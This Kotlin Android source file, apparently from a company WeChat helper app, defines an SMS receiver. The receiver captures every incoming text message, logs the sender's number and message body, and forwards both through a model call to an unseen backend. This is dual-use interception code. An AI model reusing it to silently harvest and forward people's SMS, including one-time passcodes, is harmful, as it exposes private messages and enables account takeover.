package com.xwq.companyvxwhelper.broadCasetReceiver

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.text.TextUtils
import com.xwq.companyvxwhelper.base.BaseBroadCastReceiver
import com.xwq.companyvxwhelper.bean.RequestBean.SendSmsReqBean
import com.xwq.companyvxwhelper.bean.ResponseBean.SendSmsResBean
import com.xwq.companyvxwhelper.mvvm.model.broadcast.SendSmsBroadCastModel
import com.xwq.companyvxwhelper.mvvm.view.broadcast.SendSmsBroadCastView
import com.xwq.companyvxwhelper.utils.LogUtil
import java.util.*

class SmsBroadCastReceiver : BaseBroadCastReceiver<SendSmsBroadCastView, SendSmsBroadCastModel>(), SendSmsBroadCastView {

    val TAG : String = SmsBroadCastReceiver::class.java.simpleName.toString()
    val SMS_RECEIVR_ACTION = "android.provider.Telephony.SMS_RECEIVED"

    override fun onReceive(p0: Context?, p1: Intent?) {

        var action = p1!!.action
        if (action.isNullOrEmpty()) {
            return
        }

        if (action.equals(SMS_RECEIVR_ACTION)) {
            var extras : Bundle = p1.extras!!

            var get : Array<Any> = extras.get("pdus") as Array<Any>
            val msg = arrayOfNulls<SmsMessage>(get.size)
            for ((index, e) in msg.withIndex()) {
                var curPdus : ByteArray = get[index] as ByteArray
                msg[index] = SmsMessage.createFromPdu(curPdus)
            }
            var content : StringBuffer = StringBuffer()
            var phoneNumber : StringBuffer = StringBuffer()
            for ((index, e) in msg.withIndex()) {
                content.append(e!!.messageBody)
                phoneNumber.append(e!!.originatingAddress)
            }
            LogUtil.log(TAG, "发送者号码: " + phoneNumber)
            LogUtil.log(TAG, "发送者信息: " + content)

            //发送消息
            sendSms(SendSmsReqBean(phoneNumber.toString(), content.toString()))
        }
    }

    private fun sendSms(sendSmsReqBean: SendSmsReqBean) {
        getModel().sendSms(sendSmsReqBean)
    }

    override fun senSmsSuccess(msg: String?, data: SendSmsResBean?) {
        // 啥事也不干
    }

    override fun sendSmsFail() {
        // 啥事也不干
    }

    override fun getView(): SendSmsBroadCastView {
        return this@SmsBroadCastReceiver
    }

    override fun getModel(): SendSmsBroadCastModel {
        return SendSmsBroadCastModel(this)
    }

}